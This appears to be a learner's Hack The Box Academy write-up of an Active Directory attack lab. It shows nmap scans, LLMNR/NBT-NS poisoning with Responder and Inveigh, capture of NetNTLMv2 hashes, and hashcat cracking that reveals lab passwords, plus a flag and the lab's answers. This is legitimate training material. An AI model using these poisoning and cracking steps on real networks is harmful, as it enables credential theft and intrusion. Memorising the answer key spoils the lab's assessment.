# Active Directory Enumeration & Attacks
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Active Directory Enumeration & Attacks
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 7 days
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## External Recon and Enumeration Principles
### Question:
![](./attachments/Pasted%20image%2020230227193651.png)
*Hint: Did you check the DNS records? Flag is in the format of " HTB{something} ".*

Go to [HE BGP Toolkit](https://bgp.he.net/).

![](./attachments/Pasted%20image%2020230227193450.png)

**Answer:** `HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}`

---
## Initial Enumeration of the Domain
### Question 1:
![](./attachments/Pasted%20image%2020230227202431.png)
*Hint: We are looking for the fully qualified domain name for the host. The commonName field will present it as <name.domain>*

TIP: A quiet scan can be made with `sudo tcpdump -i ens224`

Else use `fping` to discover hosts.

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $fping -asgq 172.16.5.0/23
172.16.5.5
172.16.5.130
172.16.5.225

     510 targets
       3 alive
     507 unreachable
       0 unknown addresses

    2028 timeouts (waiting for response)
    2031 ICMP Echos sent
       3 ICMP Echo Replies received
    2028 other ICMP received

 0.053 ms (min round trip time)
 0.576 ms (avg round trip time)
 1.36 ms (max round trip time)
       15.005 sec (elapsed real time)
```

Scanning `172.16.5.5` with `nmap`.

```
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $sudo nmap -n -sC -sV 172.16.5.5
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-27 14:35 EST
Nmap scan report for 172.16.5.5
Host is up (0.051s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-27 19:35:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-27T19:36:19+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Not valid before: 2022-03-30T22:40:24
|_Not valid after:  2023-03-30T22:40:24
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Not valid before: 2022-03-30T22:40:24
|_Not valid after:  2023-03-30T22:40:24
|_ssl-date: 2023-02-27T19:36:19+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2023-02-27T19:36:19+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Not valid before: 2022-03-30T22:40:24
|_Not valid after:  2023-03-30T22:40:24
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Not valid before: 2022-03-30T22:40:24
|_Not valid after:  2023-03-30T22:40:24
|_ssl-date: 2023-02-27T19:36:19+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-02-27T19:36:19+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-27T19:36:11+00:00
| ssl-cert: Subject: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Not valid before: 2023-02-26T19:25:04
|_Not valid after:  2023-08-28T19:25:04
MAC Address: 00:50:56:B9:47:7C (VMware)
Service Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: ACADEMY-EA-DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:47:7c (VMware)
| smb2-time: 
|   date: 2023-02-27T19:36:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.23 seconds
```

**Answer:** `ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`

---
## 
### Question 2:
![](./attachments/Pasted%20image%2020230227202441.png)
*Hint: You can grep your output for the string if needed.*

Scanning `172.16.5.130` with `nmap`.

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $sudo nmap -n -sC -sV 172.16.5.130
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-27 14:38 EST
Nmap scan report for 172.16.5.130
Host is up (0.028s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-FILE
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-27T19:25:17
|_Not valid after:  2053-02-27T19:25:17
|_ssl-date: 2023-02-27T19:40:17+00:00; 0s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
| Not valid before: 2023-02-26T19:25:00
|_Not valid after:  2023-08-28T19:25:00
|_ssl-date: 2023-02-27T19:40:17+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-FILE
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2023-02-27T19:39:13+00:00
16001/tcp open  mc-nmf        .NET Message Framing
MAC Address: 00:50:56:B9:C3:E1 (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-27T19:39:13
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ACADEMY-EA-FILE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:c3:e1 (VMware)
| ms-sql-info: 
|   172.16.5.130:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.58 seconds
```

**Answer:** `172.16.5.130`

---
## LLMNR/NBT-NS Poisoning - from Linux
### Question 1:
![](./attachments/Pasted%20image%2020230227210457.png)

Run `Responder` on interface `ens224`

```
┌─[✗]─[htb-student@ea-attack01]─[~]
└──╼ $sudo responder -I ens224
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [ens224]
    Responder IP               [172.16.5.225]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-IBXKDR71BNM]
    Responder Domain Name      [VKNO.LOCAL]
    Responder DCE-RPC Port     [49236]
[!] Error starting TCP server on port 3389, check permissions or other servers running.

[+] Listening for events...

[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
```

Responder logs are located at `/usr/share/responder/logs`

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $ls /usr/share/responder/logs
Analyzer-Session.log  MSSQL-NTLMv2-172.16.5.130.txt  Responder-Session.log
Config-Responder.log  Poisoners-Session.log          SMB-NTLMv2-SSP-172.16.5.130.txt

┌─[htb-student@ea-attack01]─[~]
└──╼ $cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.130.txt
(...)
backupagent::INLANEFREIGHT:55d6cc0b5f096f26:7DA4B501FA3715BAB8F47A02E3ADB313:010100000000000080EDF216264BD9012E07B4F3FE63D69C00000000020008004D0034005100450001001E00570049004E002D004B003600470042004F003000390035004D003900390004003400570049004E002D004B003600470042004F003000390035004D00390039002E004D003400510045002E004C004F00430041004C00030014004D003400510045002E004C004F00430041004C00050014004D003400510045002E004C004F00430041004C000700080080EDF216264BD9010600040002000000080030003000000000000000000000000030000081EFD46BF269100B5990CCA14FBC143CCE7570D410234192FA081C5FF453858E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
(...)
```

**Answer:** `backupagent`

### Question 2:
![](./attachments/Pasted%20image%2020230227210507.png)

Save the hash to a file.

```
┌──(kali㉿kali)-[~/HTB/ActiveDirectoryEnumerationAttacks]
└─$ echo "backupagent::INLANEFREIGHT:55d6cc0b5f096f26:7DA4B501FA3715BAB8F47A02E3ADB313:010100000000000080EDF216264BD9012E07B4F3FE63D69C00000000020008004D0034005100450001001E00570049004E002D004B003600470042004F003000390035004D003900390004003400570049004E002D004B003600470042004F003000390035004D00390039002E004D003400510045002E004C004F00430041004C00030014004D003400510045002E004C004F00430041004C00050014004D003400510045002E004C004F00430041004C000700080080EDF216264BD9010600040002000000080030003000000000000000000000000030000081EFD46BF269100B5990CCA14FBC143CCE7570D410234192FA081C5FF453858E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > Backupagent.hash
```

Now crack the hash with `hashcat`.

```
┌──(kali㉿kali)-[~/HTB/ActiveDirectoryEnumerationAttacks]
└─$ hashcat -m 5600 Backupagent.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

BACKUPAGENT::INLANEFREIGHT:55d6cc0b5f096f26:7da4b501fa3715bab8f47a02e3adb313:010100000000000080edf216264bd9012e07b4f3fe63d69c00000000020008004d0034005100450001001e00570049004e002d004b003600470042004f003000390035004d003900390004003400570049004e002d004b003600470042004f003000390035004d00390039002e004d003400510045002e004c004f00430041004c00030014004d003400510045002e004c004f00430041004c00050014004d003400510045002e004c004f00430041004c000700080080edf216264bd9010600040002000000080030003000000000000000000000000030000081efd46bf269100b5990cca14fbc143cce7570d410234192fa081c5ff453858e0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: BACKUPAGENT::INLANEFREIGHT:55d6cc0b5f096f26:7da4b50...000000
Time.Started.....: Tue Feb 28 04:15:06 2023 (6 secs)
Time.Estimated...: Tue Feb 28 04:15:12 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1365.8 kH/s (1.21ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7733248/14344385 (53.91%)
Rejected.........: 0/7733248 (0.00%)
Restore.Point....: 7731200/14344385 (53.90%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: h2nzyoo -> h101814
Hardware.Mon.#1..: Util: 82%

Started: Tue Feb 28 04:15:05 2023
Stopped: Tue Feb 28 04:15:13 2023
```

User:pass `backupagent:h1backup55`

**Answer:** `h1backup55`

### Question 3:
![](./attachments/Pasted%20image%2020230227210554.png)

And now for `Wley`.

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.130.txt
(...)
wley::INLANEFREIGHT:71b33da336d4c5c8:79CA968892C1B9010DB13C1C90CB4672:010100000000000080EDF216264BD901FE27A112432AF2E100000000020008004D0034005100450001001E00570049004E002D004B003600470042004F003000390035004D003900390004003400570049004E002D004B003600470042004F003000390035004D00390039002E004D003400510045002E004C004F00430041004C00030014004D003400510045002E004C004F00430041004C00050014004D003400510045002E004C004F00430041004C000700080080EDF216264BD9010600040002000000080030003000000000000000000000000030000081EFD46BF269100B5990CCA14FBC143CCE7570D410234192FA081C5FF453858E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

Save the hash.

```
┌──(kali㉿kali)-[~/HTB/ActiveDirectoryEnumerationAttacks]
└─$ echo "wley::INLANEFREIGHT:71b33da336d4c5c8:79CA968892C1B9010DB13C1C90CB4672:010100000000000080EDF216264BD901FE27A112432AF2E100000000020008004D0034005100450001001E00570049004E002D004B003600470042004F003000390035004D003900390004003400570049004E002D004B003600470042004F003000390035004D00390039002E004D003400510045002E004C004F00430041004C00030014004D003400510045002E004C004F00430041004C00050014004D003400510045002E004C004F00430041004C000700080080EDF216264BD9010600040002000000080030003000000000000000000000000030000081EFD46BF269100B5990CCA14FBC143CCE7570D410234192FA081C5FF453858E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > wley#1.hash
```

Crack it.

```
┌──(kali㉿kali)-[~/HTB/ActiveDirectoryEnumerationAttacks]
└─$ hashcat -m 5600 wley#1.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

WLEY::INLANEFREIGHT:71b33da336d4c5c8:79ca968892c1b9010db13c1c90cb4672:010100000000000080edf216264bd901fe27a112432af2e100000000020008004d0034005100450001001e00570049004e002d004b003600470042004f003000390035004d003900390004003400570049004e002d004b003600470042004f003000390035004d00390039002e004d003400510045002e004c004f00430041004c00030014004d003400510045002e004c004f00430041004c00050014004d003400510045002e004c004f00430041004c000700080080edf216264bd9010600040002000000080030003000000000000000000000000030000081efd46bf269100b5990cca14fbc143cce7570d410234192fa081c5ff453858e0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WLEY::INLANEFREIGHT:71b33da336d4c5c8:79ca968892c1b9...000000
Time.Started.....: Tue Feb 28 04:16:33 2023 (2 secs)
Time.Estimated...: Tue Feb 28 04:16:35 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1414.2 kH/s (1.13ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3098624/14344385 (21.60%)
Rejected.........: 0/3098624 (0.00%)
Restore.Point....: 3096576/14344385 (21.59%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: trapping1 -> tramore1993
Hardware.Mon.#1..: Util: 83%

Started: Tue Feb 28 04:16:32 2023
Stopped: Tue Feb 28 04:16:37 2023
```

User:pass `wley:transporter@4`

**Answer:** `transporter@4`

---
## LLMNR/NBT-NS Poisoning - from Windows
### Question:
![](./attachments/Pasted%20image%2020230228105445.png)

Run `Inveigh.exe`.

![](./attachments/Pasted%20image%2020230228110459.png)

```
[-] [01:58:17] LLMNR(AAAA) request [academy-ea-web0] from fe80::ac98:4694:1255:5f55%8 [type ignored]
[-] [01:58:17] LLMNR(AAAA) request [academy-ea-web0] from fe80::ac98:4694:1255:5f55%8 [type ignored]
[-] [01:58:17] LLMNR(AAAA) request [academy-ea-web0] from fe80::ac98:4694:1255:5f55%8 [type ignored]
[-] [01:58:17] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.130 [type ignored]
[-] [01:58:17] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.130 [type ignored]
[ ] [01:58:17] NBNS(00) request [ACADEMY-EA-WEB0] from 172.16.5.130 [disabled]
[ ] [01:58:17] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.130 [disabled]
[ ] [01:58:17] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::ac98:4694:1255:5f55%8 [disabled]
[ ] [01:58:17] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.130 [disabled]
[ ] [01:58:17] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::ac98:4694:1255:5f55%8 [disabled]
[+] [01:58:17] LLMNR(A) request [academy-ea-web0] from fe80::ac98:4694:1255:5f55%8 [response sent]
[-] [01:58:17] LLMNR(AAAA) request [academy-ea-web0] from fe80::ac98:4694:1255:5f55%8 [type ignored]
[+] [01:58:17] LLMNR(A) request [academy-ea-web0] from 172.16.5.130 [response sent]
[-] [01:58:17] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.130 [type ignored]
[ ] [01:58:17] NBNS(00) request [ACADEMY-EA-WEB0] from 172.16.5.130 [disabled]
[ ] [01:58:17] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.130 [disabled]
[ ] [01:58:17] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::ac98:4694:1255:5f55%8 [disabled]
[ ] [01:58:17] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::ac98:4694:1255:5f55%8 [disabled]
[ ] [01:58:17] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.130 [disabled]
[+] [01:58:17] LLMNR(A) request [academy-ea-web0] from fe80::ac98:4694:1255:5f55%8 [response sent]
[+] [01:58:17] LLMNR(A) request [academy-ea-web0] from 172.16.5.130 [response sent]
(...)
```

Press `Esc` to enter the console.

Type `GET NTLMV2USERNAME` to get all username hashes collected.

```
C(0:0) NTLMv1(0:0) NTLMv2(6:105)> GET NTLMV2USERNAMES
=================================================== NTLMv2 Usernames ===================================================

IP Address                        Host                              Username                          Challenge
========================================================================================================================
172.16.5.130                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\lab_adm           | 6D6C43873B3D8F1D
172.16.5.130                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\forend            | EFD52AF03BBB5111
172.16.5.130                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\wley              | FB352BEF41C85950
172.16.5.130                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\clusteragent      | F90E9A62156C671E
172.16.5.130                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\backupagent       | E90DD72232176CE3
172.16.5.130                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\svc_qualys        | 63407A7FDFCCB84B
```

And `GET NTLMV2UNIQUE` to get the hashes.

```
C(0:0) NTLMv1(0:0) NTLMv2(6:105)> GET NTLMV2UNIQUE
Hashes
========================================================================================================================
(...)
svc_qualys::INLANEFREIGHT:63407A7FDFCCB84B:3055BFA98E9C522E8DB2EABE57FF4F5C:010100000000000078B725955B4BD90183223A6446212FB70000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080078B725955B4BD901060004000200000008003000300000000000000000000000003000000C2BB6EB4A8ED0FFFC91B17BB34AAA8F6F03707A521E6964F28EA862C93E45A10A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
```

Now we can paste the hash into a file and crack it with `hashcat`.

```
┌──(kali㉿kali)-[~/HTB/ActiveDirectoryEnumerationAttacks]
└─$ echo "svc_qualys::INLANEFREIGHT:63407A7FDFCCB84B:3055BFA98E9C522E8DB2EABE57FF4F5C:010100000000000078B725955B4BD90183223A6446212FB70000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080078B725955B4BD901060004000200000008003000300000000000000000000000003000000C2BB6EB4A8ED0FFFC91B17BB34AAA8F6F03707A521E6964F28EA862C93E45A10A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000" > svc_qualys.hash   
                                                                                                                    
┌──(kali㉿kali)-[~/HTB/ActiveDirectoryEnumerationAttacks]
└─$ hashcat -m 5600 svc_qualys.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

SVC_QUALYS::INLANEFREIGHT:63407a7fdfccb84b:3055bfa98e9c522e8db2eabe57ff4f5c:010100000000000078b725955b4bd90183223a6446212fb70000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000700080078b725955b4bd901060004000200000008003000300000000000000000000000003000000c2bb6eb4a8ed0fffc91b17bb34aaa8f6f03707a521e6964f28ea862c93e45a10a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:security#1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVC_QUALYS::INLANEFREIGHT:63407a7fdfccb84b:3055bfa9...000000
Time.Started.....: Tue Feb 28 05:03:43 2023 (3 secs)
Time.Estimated...: Tue Feb 28 05:03:46 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1340.4 kH/s (1.21ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3923968/14344385 (27.36%)
Rejected.........: 0/3923968 (0.00%)
Restore.Point....: 3921920/14344385 (27.34%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: sed73alb! -> seciocastor2
Hardware.Mon.#1..: Util: 82%

Started: Tue Feb 28 05:03:42 2023
Stopped: Tue Feb 28 05:03:47 2023
```

User:pass `svc_qualys:security#1`

**Answer:** `security#1`

---
## Enumerating & Retrieving Password Policies
### Question:
![](./attachments/Pasted%20image%2020230228114958.png)

![](./attachments/Pasted%20image%2020230228115102.png)

**Answer:** `7`

### Question:
![](./attachments/Pasted%20image%2020230228115007.png)

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $enum4linux-ng -P 172.16.5.5 -oA ilfreight
ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 172.16.5.5
[*] Username ......... ''
[*] Random Username .. 'geporlsn'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

(...)

 =======================================
